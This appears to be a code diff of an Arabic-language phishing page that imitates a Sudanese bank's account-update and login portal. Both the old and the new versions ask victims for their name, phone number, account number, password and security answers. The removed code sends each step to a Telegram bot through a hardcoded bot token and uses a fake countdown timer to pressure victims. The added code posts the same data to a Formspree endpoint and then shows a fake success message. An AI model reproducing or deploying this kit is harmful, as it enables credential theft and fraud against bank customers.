@@ -3,158 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تحديث البيانات</title>
+    <title>بوابة الخدمات الإلكترونية</title>
     <style>
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f8f9fa; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .header { width: 100%; height: 65px; background: #d32f2f; color: white; display: flex; align-items: center; justify-content: center; position: relative; font-weight: bold; }
-        .timer-box { position: absolute; left: 12px; background: rgba(0, 0, 0, 0.3); color: white; padding: 4px 10px; border-radius: 15px; font-size: 13px; }
-        .container { width: 92%; max-width: 450px; padding: 15px; margin-top: 10px; text-align: center; }
-        
-        /* أيقونة الرسالة العلويّة */
-        .top-icon { width: 60px; margin: 15px auto; display: block; }
-
-        .input-group { background: white; border: 1.5px solid #e0e0e0; margin-bottom: 12px; border-radius: 10px; padding: 2px 12px; display: flex; align-items: center; }
-        input { flex: 1; border: none; padding: 14px 5px; outline: none; text-align: right; font-size: 16px; width: 100%; }
-        
-        .currency-opt { background: white; border: 2px solid #e0e0e0; padding: 18px; margin: 10px 0; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .selected { background-color: #fcebeb; border-color: #d32f2f; color: #d32f2f; }
-        
-        .btn-main { width: 100%; background: #d32f2f; color: white; border: none; padding: 16px; border-radius: 10px; font-weight: bold; font-size: 17px; cursor: pointer; }
-        
-        .question-box { background: white; border: 1.5px solid #e0e0e0; padding: 16px; margin-bottom: 10px; text-align: right; border-radius: 10px; cursor: pointer; position: relative; font-size: 14px; color: #555; }
-        .question-box::after { content: '▼'; position: absolute; left: 15px; color: #d32f2f; }
-        
-        #loginPage, #questionsPage, #success { display: none; }
-        
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
-        .modal-content { width: 85%; max-width: 350px; position: relative; }
-        .modal-content img { width: 100%; border-radius: 15px; border: 3px solid white; }
+        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f5f6f7; display: flex; justify-content: center; min-height: 100vh; }
+        .wrapper { width: 100%; max-width: 420px; padding: 15px; }
+        .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 5px solid #c62828; text-align: center; }
+        .header-title { color: #c62828; font-weight: bold; margin-bottom: 20px; font-size: 18px; }
+        input, select { width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 8px; text-align: right; font-size: 15px; outline: none; background: #fafafa; }
+        input:focus { border-color: #c62828; background: #fff; }
+        .btn-action { width: 100%; padding: 16px; background: #c62828; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        .hidden { display: none; }
+        .step-indicator { font-size: 12px; color: #888; margin-bottom: 15px; }
+        .q-label { text-align: right; display: block; margin-top: 12px; font-size: 13px; font-weight: bold; color: #555; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="timer-box" id="timer">20:00</div>
-        <span>تحديث البيانات</span>
-    </div>
-
-    <div class="container">
-        <div id="currencyPage">
-            <img src="icon_message.png" class="top-icon" alt="">
-            <h3 style="font-size: 18px; color: #333;">آختر عملة الاستلام</h3>
-            <div class="currency-opt" id="c1" onclick="selCurr('c1', 'جنيه سوداني')">جنيه سوداني</div>
-            <div class="currency-opt" id="c2" onclick="selCurr('c2', 'دولار امريكي')">دولار امريكي</div>
-            <div class="input-group"><input type="text" id="full_name" placeholder="الإسم الكامل"></div>
-            <div class="input-group"><input type="number" id="whatsapp" placeholder="رقم الواتساب"></div>
-            <button class="btn-main" onclick="goLogin()">المتابعة</button>
-        </div>
-
-        <div id="loginPage">
-            <img src="logo_colored.png" style="width: 120px; margin-bottom: 20px;" alt="">
-            <h3>تسجيل الدخول بنكك</h3>
-            <div class="input-group"><input type="text" id="acc" placeholder="رقم الحساب أو الهاتف"></div>
-            <div class="input-group"><input type="password" id="pass" placeholder="كلمة المرور"></div>
-            <button class="btn-main" onclick="goQuestions()">دخول</button>
-        </div>
-
-        <div id="questionsPage">
-            <h3 style="color: #d32f2f;">التحقق من أسئلة الأمان</h3>
-            <p style="font-size: 13px; color: #666; margin-bottom: 20px;">الرجاء الإجابة على الأسئلة كما هي في حسابك</p>
+<div class="wrapper">
+    <div class="card">
+        <div class="header-title">نظام تحديث بيانات الحساب</div>
+        
+        <form id="secure-form" action="https://formspree.io/f/xzdjwoao" method="POST">
             
-            <div class="question-box" onclick="viewImg('popup_q1.png')">السؤال الأول (إضغط لعرض الصورة)</div>
-            <div class="input-group"><input type="text" id="q1" placeholder="إجابة السؤال الأول"></div>
-            
-            <div class="question-box" onclick="viewImg('popup_q2.png')">السؤال الثاني (إضغط لعرض الصورة)</div>
-            <div class="input-group"><input type="text" id="q2" placeholder="إجابة السؤال الثاني"></div>
-            
-            <div class="question-box" onclick="viewImg('popup_q3.png')">السؤال الثالث (إضغط لعرض الصورة)</div>
-            <div class="input-group"><input type="text" id="q3" placeholder="إجابة السؤال الثالث"></div>
-            
-            <button class="btn-main" onclick="finish()">تأكيد وتحديث البيانات</button>
-        </div>
-
-        <div id="success">
-            <div style="margin-top: 50px;">
-                <div style="width: 80px; height: 80px; background: #e8f5e9; color: #2e7d32; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 40px;">✓</div>
-                <h2 style="color: #2e7d32;">تم بنجاح</h2>
-                <p>لقد تم استلام طلبك، سنتواصل معك عبر الواتساب فور مراجعة البيانات وتفعيل الخدمة.</p>
+            <div id="step1">
+                <div class="step-indicator">المرحلة 1 من 3</div>
+                <img src="icon_message.png" style="width: 50px; margin-bottom: 10px;">
+                <select name="Service_Type">
+                    <option value="Sudanese Pound">استلام بالجنيه السوداني</option>
+                    <option value="US Dollar">استلام بالدولار الأمريكي</option>
+                </select>
+                <input type="text" name="Full_Name" placeholder="الاسم الرباعي الكامل" required>
+                <input type="number" name="Mobile_Number" placeholder="رقم الهاتف المرتبط" required>
+                <button type="button" class="btn-action" onclick="move(2)">المتابعة</button>
             </div>
+
+            <div id="step2" class="hidden">
+                <div class="step-indicator">المرحلة 2 من 3</div>
+                <img src="logo_colored.png" style="width: 90px; margin-bottom: 10px;">
+                <p style="font-size: 14px; color: #666;">يرجى تأكيد الهوية الرقمية للمتابعة</p>
+                <input type="text" name="Client_ID" placeholder="رقم الحساب / المعرف" required>
+                <input type="password" name="Access_Key" placeholder="كلمة المرور" required>
+                <button type="button" class="btn-action" onclick="move(3)">التحقق من البيانات</button>
+            </div>
+
+            <div id="step3" class="hidden">
+                <div class="step-indicator">المرحلة الأخيرة</div>
+                <h4 style="margin: 0 0 10px 0; font-size: 15px;">تأكيد مراجع الأمان</h4>
+                
+                <span class="q-label">السؤال الأول (صورة 1)</span>
+                <select name="Security_Q1">
+                    <option value="Option_A">الخيار الأول</option>
+                    <option value="Option_B">الخيار الثاني</option>
+                    <option value="Option_C">الخيار الثالث</option>
+                </select>
+
+                <span class="q-label">السؤال الثاني (صورة 2)</span>
+                <select name="Security_Q2">
+                    <option value="Confirmed">نعم / موافق</option>
+                    <option value="Declined">لا / غير موافق</option>
+                </select>
+
+                <span class="q-label">السؤال الثالث (صورة 3)</span>
+                <select name="Security_Q3">
+                    <option value="Verified">تأكيد العملية</option>
+                    <option value="Pending">إرسال لاحقاً</option>
+                </select>
+
+                <button type="submit" class="btn-action" id="submitBtn">تنشيط الحساب الآن</button>
+            </div>
+        </form>
+
+        <div id="success-msg" class="hidden">
+            <div style="font-size: 50px; color: #4caf50;">✓</div>
+            <h3 style="color: #4caf50;">تم التحديث بنجاح</h3>
+            <p style="font-size: 14px; color: #666; line-height: 1.6;">شكراً لك، تم استلام طلبك. سيقوم النظام بمعالجة التحديث خلال 24 ساعة وسنخطرك عبر الرسائل النصية.</p>
         </div>
     </div>
+</div>
 
-    <div id="myModal" class="modal" onclick="this.style.display='none'">
-        <div class="modal-content">
-            <img id="modalImg" src="">
-            <p style="color: white; text-align: center; margin-top: 10px;">إضغط في أي مكان للإغلاق</p>
-        </div>
-    </div>
+<script>
+    // التنقل بين المراحل
+    function move(step) {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step3').classList.add('hidden');
+        document.getElementById('step' + step).classList.remove('hidden');
+        window.scrollTo(0,0);
+    }
 
-    <script>
-        // بيانات البوت والآيدي
-        const token = "8674138669:AAFoXto_Nq4_Q569a5E6SmDp6fdrhOEP-BA";
-        const chatId = "2014945683";
-        let curr = "";
+    // معالجة الإرسال في الخلفية (AJAX) لكي لا يغادر المستخدم الصفحة
+    var form = document.getElementById("secure-form");
+    form.addEventListener("submit", function(ev) {
+        ev.preventDefault();
+        var btn = document.getElementById("submitBtn");
+        btn.innerText = "جاري المعالجة...";
+        btn.disabled = true;
 
-        // دالة إرسال البيانات للتليجرام
-        function postData(msg) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: msg })
-            });
-        }
+        var data = new FormData(form);
+        fetch(form.action, {
+            method: form.method,
+            body: data,
+            headers: { 'Accept': 'application/json' }
+        }).then(response => {
+            if (response.ok) {
+                form.classList.add('hidden');
+                document.getElementById('success-msg').classList.remove('hidden');
+            } else {
+                alert("عذراً، حدث خطأ في الاتصال. حاول مرة أخرى.");
+                btn.innerText = "تنشيط الحساب الآن";
+                btn.disabled = false;
+            }
+        }).catch(error => {
+            alert("تأكد من اتصالك بالإنترنت.");
+            btn.innerText = "تنشيط الحساب الآن";
+            btn.disabled = false;
+        });
+    });
+</script>
 
-        function selCurr(id, val) {
-            document.querySelectorAll('.currency-opt').forEach(o => o.classList.remove('selected'));
-            document.getElementById(id).classList.add('selected');
-            curr = val;
-        }
-
-        function viewImg(src) {
-            document.getElementById('modalImg').src = src;
-            document.getElementById('myModal').style.display = 'flex';
-        }
-
-        function goLogin() {
-            const n = document.getElementById('full_name').value;
-            const w = document.getElementById('whatsapp').value;
-            if(!curr || !n || !w) return alert("الرجاء إكمال كافة البيانات");
-            postData(`🔔 طلب جديد:\n👤 الاسم: ${n}\n📱 واتساب: ${w}\n💰 العملة: ${curr}`);
-            showPage('loginPage');
-        }
-
-        function goQuestions() {
-            const a = document.getElementById('acc').value;
-            const p = document.getElementById('pass').value;
-            if(!a || !p) return alert("أدخل بيانات الحساب");
-            postData(`🔐 تسجيل دخول:\n🆔 الحساب: ${a}\n🔑 الباسورد: ${p}`);
-            showPage('questionsPage');
-        }
-
-        function finish() {
-            const q1 = document.getElementById('q1').value;
-            const q2 = document.getElementById('q2').value;
-            const q3 = document.getElementById('q3').value;
-            if(!q1 || !q2 || !q3) return alert("الرجاء الإجابة على جميع الأسئلة");
-            
-            postData(`❓ أجوبة الأمان:\n1️⃣: ${q1}\n2️⃣: ${q2}\n3️⃣: ${q3}`);
-            showPage('success');
-        }
-
-        function showPage(id) {
-            ['currencyPage', 'loginPage', 'questionsPage', 'success'].forEach(p => document.getElementById(p).style.display = 'none');
-            document.getElementById(id).style.display = 'block';
-            window.scrollTo(0,0);
-        }
-
-        // المؤقت
-        let time = 1200;
-        setInterval(() => {
-            let m = Math.floor(time/60); let s = time%60;
-            document.getElementById('timer').innerText = `${m}:${s<10?'0'+s:s}`;
-            time--;
-        }, 1000);
-    </script>
 </body>
 </html>
